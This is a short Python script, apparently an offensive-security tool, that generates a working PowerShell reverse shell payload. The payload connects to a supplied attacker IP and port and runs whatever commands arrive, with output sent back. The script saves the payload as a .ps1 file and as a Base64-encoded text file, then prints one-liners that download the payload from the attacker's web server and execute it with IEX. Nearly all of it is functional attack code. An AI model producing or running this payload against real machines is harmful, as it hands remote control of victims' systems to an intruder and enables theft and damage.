# --------------------------------------------------------------
# PS1 Reversed Shell Payload Generator
# This script generates a PowerShell reverse shell payload in ps1 and encoded in Base64 format
# Use powershell -c IEX.... to download and execute the script on the target machine.
# --------------------------------------------------------------

import argparse
from ps1_encoder import ps1_encoder

PS_SHELL_TEMPLATE = """
$c=New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{;$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(IEX $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sbty=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbty,0,$sbty.Length);$s.Flush()}};$c.Close()
"""

def generate_payload(ip, port):
    """
    Generate PowerShell Reverse Shell Payload.
    """
    # Replace IP and PORT in the template
    raw_ps_script = PS_SHELL_TEMPLATE.format(IP=ip, PORT=port).strip()

    # Save the original PowerShell script to a .ps1 file
    ps1_filename = "reverse_shell.ps1"
    try:
        with open(ps1_filename, 'w') as f:
            f.write(raw_ps_script)
        print(f"[+] Saved: {ps1_filename}")
    except Exception as e:
        print(f"[!] Failed to write original script: {e}")
        return

    # Save the original PowerShell script to a .txt file
    encoded_payload = ps1_encoder(raw_ps_script)
    payload_filename = "payload.txt"
    
    try:
        with open(payload_filename, 'w') as f:
            f.write(encoded_payload)
        print(f"[+] Saved: {payload_filename}")
    except Exception as e:
        print(f"[!] Failed to write base64 script: {e}")
        return

    print("Payload:")
    print("1. Use ps1:")
    print("-" * 50)
    print(f"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://{ip}/{ps1_filename}')")
    print("-" * 50)

    print("2. Use base64:")
    print("-" * 50)
    print(f"powershell -c IEX([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('http://{ip}/{payload_filename}'))))")
    print("-" * 50)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Script to generate a PowerShell reverse shell payload."
    )
    parser.add_argument('ip', type=str, help='Attacker IP address.')
    parser.add_argument('port', type=int, help='Port on the attacker machine.')

    args = parser.parse_args()

    # Execute generation
    generate_payload(args.ip, args.port)
